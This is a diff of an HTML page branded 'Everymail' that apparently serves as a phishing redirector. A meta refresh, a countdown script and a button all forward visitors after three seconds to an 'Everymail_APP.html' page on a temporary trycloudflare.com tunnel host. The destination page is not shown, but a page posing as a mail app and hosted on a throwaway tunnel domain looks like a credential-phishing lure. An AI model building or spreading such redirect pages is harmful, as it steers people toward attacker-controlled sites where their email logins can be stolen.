@@ -1,10 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta https://nevada-sapphire-barnes-put.trycloudflare.com/link/app/Everymail_APP.html" />
-    <title>Redirecting...</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Everymail — Redirecting...</title>
+
+  <!-- Automatic redirect after 3 seconds -->
+  <meta http-equiv="refresh" content="3; url='https://nevada-sapphire-barnes-put.trycloudflare.com/link/app/Everymail_APP.html'">
+
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin:0; min-height:100vh;
+           display:flex; align-items:center; justify-content:center; background:#f6f8fa; color:#0f172a; }
+    .card { max-width:640px; width:100%; padding:32px; text-align:center; background:#fff; border-radius:12px;
+           box-shadow:0 6px 24px rgba(12,18,31,0.08); }
+    h1 { margin:0 0 12px; font-size:20px; }
+    p { margin:0 0 20px; color:#334155; }
+    .btn { display:inline-block; padding:12px 20px; background:#0b5cff; color:#fff; border-radius:8px;
+           text-decoration:none; font-weight:600; }
+    .small { margin-top:12px; font-size:13px; color:#64748b; }
+  </style>
+
+  <script>
+    (function(){
+      var target = "https://nevada-sapphire-barnes-put.trycloudflare.com/link/app/Everymail_APP.html";
+      var countdown = 3;
+      window.addEventListener('DOMContentLoaded', function(){
+        var el = document.getElementById('countdown');
+        if (!el) return;
+        el.textContent = countdown;
+        var t = setInterval(function(){
+          countdown--;
+          if (countdown <= 0) {
+            clearInterval(t);
+            window.location.href = target;
+          } else {
+            el.textContent = countdown;
+          }
+        }, 1000);
+      });
+    })();
+  </script>
 </head>
 <body>
-    <p>Redirecting...</p>
+  <div class="card" role="main">
+    <h1>Opening Everymail...</h1>
+    <p>You'll be redirected shortly. If the redirect doesn't happen, click the button below.</p>
+
+    <a class="btn" href="https://nevada-sapphire-barnes-put.trycloudflare.com/link/app/Everymail_APP.html" rel="noopener noreferrer" target="_blank">
+      Open Everymail
+    </a>
+
+    <div class="small">Redirecting in <span id="countdown">3</span> seconds — or click the button above.</div>
+  </div>
 </body>
 </html>
